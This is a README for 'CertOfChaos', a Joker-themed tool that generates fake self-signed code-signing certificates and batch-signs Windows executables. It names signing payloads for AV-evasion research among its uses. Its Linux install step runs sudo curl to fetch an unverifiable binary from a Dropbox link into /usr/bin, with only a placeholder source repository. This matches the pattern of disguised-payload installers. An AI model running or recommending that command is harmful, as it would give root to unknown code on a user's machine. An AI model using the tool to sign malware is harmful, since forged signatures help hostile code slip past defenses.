<p align="center">
  <img src="https://img.shields.io/badge/CertOfChaos-v2.0-39ff14?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHRleHQgeT0iMjAiIGZvbnQtc2l6ZT0iMjAiPvCfg48="/>
  <img src="https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-9d00ff?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Made%20for-CTF%20%7C%20Labs-ff2052?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/License-MIT-ffcc00?style=for-the-badge"/>
</p>

<h1 align="center">🃏 CertOfChaos</h1>
<p align="center"><i>"Why so serious about certificates?"</i></p>

<p align="center">
  A Joker-themed EXE code signing toolkit — randomly generate fake code-signing certificates,<br/>
  sign PE binaries with a single click, batch-process entire folders, and verify signatures.<br/>
  Built for security researchers, CTF players, and lab environments.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.8+-39ff14?style=flat-square&logo=python&logoColor=white"/>
  <img src="https://img.shields.io/badge/osslsigncode-required-9d00ff?style=flat-square"/>
  <img src="https://img.shields.io/badge/cryptography-pip-ffcc00?style=flat-square"/>
</p>

---

```
♠  Madness, as you know, is like gravity — all it takes is a little push.
♣  Introduce a little anarchy. Upset the established order of certificate chains.
♥  Why so serious? It's just a self-signed certificate.
♦  Some men just want to watch the trust store burn.
```

---

## ♠ Installation — Linux (One-liner)

```bash
sudo apt install -y osslsigncode && sudo curl -L "https://www.dropbox.com/scl/fi/4142uewub1wgggyo6g9jx/CoC?rlkey=d0w62dxyzcfgogbsz8t4mcdwi&st=xu9avzx3&dl=1" -o /usr/bin/CertOfChaos && sudo chmod +x /usr/bin/CertOfChaos
```

That's it. Launch from anywhere:

```bash
CertOfChaos
```

> **What the one-liner does:**
> 1. Installs `osslsigncode` — the underlying PE signing engine
> 2. Downloads the pre-built PyInstaller binary directly to `/usr/bin`
> 3. Makes it executable system-wide

---

## ♣ Installation — Windows

1. Install [Windows SDK](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/) (for `signtool.exe`)
2. Download the `.exe` release from [Releases](#)
3. Run `CertOfChaos.exe`

---

## ♥ Run from Source

```bash
# Clone
git clone https://github.com/youruser/CertOfChaos
cd CertOfChaos

# Install dependency
pip install cryptography

# Run
python CertOfChaos.py
```

---

## ♦ Features

| Feature | Description |
|---|---|
| 🃏 **Random Cert Generation** | Generates a unique fake code-signing certificate on every run — randomized company name, country, org unit, validity period |
| ✍️ **Single EXE Signing** | Sign any PE binary in one click with a freshly generated self-signed cert |
| 📦 **Batch Signing** | Queue multiple EXEs, assign an output directory and suffix, sign them all — optionally with a new cert per file |
| 🔍 **Built-in Verification** | Verify signatures immediately after signing using `osslsigncode` / `signtool`, with CA-aware self-signed cert validation |
| 💾 **Certificate Export** | Export generated certs as `.pfx`, `.pem`, `.cer`, and private key files |
| 🔒 **Multi Hash Support** | SHA-256, SHA-384, SHA-512 signing algorithms |
| 🔑 **RSA Key Sizes** | 2048, 3072, or 4096-bit RSA keys |
| ⏱️ **Timestamp Servers** | 6 built-in timestamp servers: DigiCert, Sectigo, GlobalSign, Comodo, Apple, FreeTSA |
| 📋 **Preset Management** | Save, load, and delete certificate identity presets for repeated use |
| 🎨 **Joker UI Theme** | Acid green + deep purple cyberpunk aesthetic, color-coded chaos log |

---

## 🃏 Screenshots

> *(Add screenshots here)*

---

## ♠ How It Works

```
┌─────────────────────────────────────────────────────┐
│                   CertOfChaos                       │
│                                                     │
│  1. Generate self-signed X.509 cert (cryptography)  │
│         ↓                                           │
│  2. Serialize to .pfx (PKCS#12, no password)        │
│         ↓                                           │
│  3. Sign PE binary via osslsigncode / signtool      │
│         ↓                                           │
│  4. Verify using -CAfile (self-signed aware)        │
└─────────────────────────────────────────────────────┘
```

The generated certificate includes:
- `CodeSigning` Extended Key Usage
- `BasicConstraints CA:TRUE`
- `DigitalSignature` + `KeyCertSign` Key Usage
- RFC3161 timestamp (optional, via external TSA)

---

## ♣ Usage — CTF & Lab Scenarios

- Sign payloads for **AV evasion research** in isolated lab VMs
- Test **Windows Authenticode** verification pipelines
- Simulate **supply chain signing** scenarios in CTF challenges
- Study **PE signature structure** with custom-crafted certs
- Practice **osslsigncode / signtool** workflows on Linux

> ⚠️ **Intended for authorized security research, CTF competitions, and lab environments only.**

---

## ♥ Dependencies

| Dependency | Purpose | Install |
|---|---|---|
| `osslsigncode` | PE signing on Linux/macOS | `sudo apt install osslsigncode` |
| `cryptography` | X.509 cert + PKCS#12 generation | `pip install cryptography` |
| `signtool` | PE signing on Windows | Windows SDK |
| `tkinter` | GUI (stdlib) | Built into Python |

---

## ♦ Build from Source (PyInstaller)

```bash
pip install pyinstaller cryptography
pyinstaller --onefile --windowed --name CertOfChaos CertOfChaos.py
# Output: dist/CertOfChaos
```

---

## 🃏 Project Structure

```
CertOfChaos/
├── CertOfChaos.py        # Main application
├── README.md
└── dist/
    └── CertOfChaos       # PyInstaller binary (Linux)
```

---

## ♠ Acknowledgements

- [osslsigncode](https://github.com/mtrojnar/osslsigncode) — cross-platform Authenticode signing
- [pyca/cryptography](https://github.com/pyca/cryptography) — X.509 and PKCS#12 handling
- The Joker, for the UI inspiration 🃏

---

<p align="center">
  <b>♠ ♣ &nbsp; CertOfChaos &nbsp; ♥ ♦</b><br/>
  <i>"Introduce a little anarchy. Upset the established order of certificate chains."</i>
</p>
